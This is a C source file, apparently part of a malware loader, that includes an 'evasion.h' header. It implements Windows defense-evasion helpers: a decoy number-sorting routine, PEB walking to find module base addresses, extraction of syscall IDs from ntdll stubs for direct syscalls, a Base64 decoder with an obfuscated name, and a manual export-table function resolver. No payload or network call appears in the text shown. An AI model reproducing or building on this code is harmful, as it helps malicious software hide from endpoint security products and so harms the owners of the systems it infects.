#include "evasion.h"
#include <wincrypt.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

void SortNumbers() {
    int numbers[ARRAY_SIZE];

    // Seed random number generator
    for (int i = 0; i < ARRAY_SIZE; i++) {
        numbers[i] = rand() % 10000;  // Random number between 0-9999
    }

    // Simple Bubble Sort (Avoids needing qsort from stdlib)
    for (int i = 0; i < ARRAY_SIZE - 1; i++) {
        for (int j = 0; j < ARRAY_SIZE - i - 1; j++) {
            if (numbers[j] > numbers[j + 1]) {
                int temp = numbers[j];
                numbers[j] = numbers[j + 1];
                numbers[j + 1] = temp;
            }
        }
    }

    // Compute the average of the sorted array
    long sum = 0;
    for (int i = 0; i < ARRAY_SIZE; i++) {
        sum += numbers[i];
    }
    float avg = (float)sum / ARRAY_SIZE;

    // Print final average
    printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
}

//GetModuleBaseAddress
PVOID GetModBA(LPCWSTR moduleName) {
    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = &pLdr->InMemoryOrderModuleList;

    for (PLIST_ENTRY pEntry = pListEntry->Flink; pEntry != pListEntry; pEntry = pEntry->Flink) {
        PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        // Extract the base name from the FullDllName
        LPCWSTR fullDllName = pDataTableEntry->FullDllName.Buffer;
        LPCWSTR baseDllName = wcsrchr(fullDllName, L'\\');
        baseDllName = (baseDllName != NULL) ? (baseDllName + 1) : fullDllName;

        if (wcsicmp(baseDllName, moduleName) == 0) {
            return pDataTableEntry->DllBase;
        }
    }
    return NULL;
}

DWORD GetSyid(LPCSTR functionName) {
    PVOID ntdllBase = GetModBA(L"ntdll.dll");
    if (!ntdllBase) return 0;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdllBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntdllBase + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)ntdllBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((BYTE*)ntdllBase + addressOfNames[i]);
        if (strcmp(name, functionName) == 0) {
            DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
            BYTE* functionPtr = (BYTE*)ntdllBase + functionRVA;
            // Syscall ID is stored at byte 4 (mov eax, XX)
            return *(DWORD*)(functionPtr + 4);
        }
    }
    return 0;
}

void SetSyid(DWORD value) {
    smID = value;
}

// Function to Base64 Decode
char* Bsfd(const char* encoded) {
    DWORD outLen = 0;
    BYTE* decoded = NULL;
    
    // Get the required output buffer size
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
        return NULL;
    }

    // Allocate buffer
    decoded = (BYTE*)malloc(outLen + 1);
    if (!decoded) return NULL;

    // Perform the decoding
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, decoded, &outLen, NULL, NULL)) {
        free(decoded);
        return NULL;
    }

    decoded[outLen] = '\0';  // Null-terminate the string
    return (char*)decoded;
}

pMod GetMod(LPCSTR mod, LPCSTR fn) {
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (!pPEB) {
        // printf("[!] Failed to retrieve PEB.\n");
        return NULL;
    }

    PPEB_LDR_DATA pLdr = pPEB->Ldr;
    if (!pLdr) {
        // printf("[!] Failed to retrieve LDR data.\n");
        return NULL;
    }

    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pEntry = pListHead->Flink;

    while (pEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pDataTable = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!pDataTable->DllBase) {
            pEntry = pEntry->Flink;
            continue;
        }

        // Get DLL base address
        HMODULE hModuleBase = (HMODULE)pDataTable->DllBase;
        WCHAR wDllName[MAX_PATH] = { 0 };
        memcpy(wDllName, pDataTable->FullDllName.Buffer, pDataTable->FullDllName.Length);

        // Convert to ANSI string
        char dllName[MAX_PATH] = { 0 };
        wcstombs(dllName, wDllName, MAX_PATH);

        // Normalize the name (convert to lowercase)
        for (int i = 0; dllName[i]; i++) {
            dllName[i] = tolower(dllName[i]);
        }

        if (strstr(dllName, mod)) {
            // printf("[*] Found %s at: %p\n", mod, hModuleBase);

            // Locate Export Directory
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModuleBase;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModuleBase + dosHeader->e_lfanew);
            IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            if (!expDir) {
                // printf("[!] Export directory not found!\n");
                return NULL;
            }

            DWORD* names = (DWORD*)((BYTE*)hModuleBase + expDir->AddressOfNames);
            WORD* ordinals = (WORD*)((BYTE*)hModuleBase + expDir->AddressOfNameOrdinals);
            DWORD* functions = (DWORD*)((BYTE*)hModuleBase + expDir->AddressOfFunctions);

            for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
                LPCSTR functionName = (LPCSTR)((BYTE*)hModuleBase + names[i]);
                if (strcmp(functionName, fn) == 0) {
                    // printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
                    return (pMod)((BYTE*)hModuleBase + functions[ordinals[i]]);
                }
            }

            // printf("[!] %s not found in %s exports.\n", fn, mod);
            return NULL;
        }

        pEntry = pEntry->Flink;
    }

    // printf("[!] %s not found in PEB.\n", mod);
    return NULL;
}
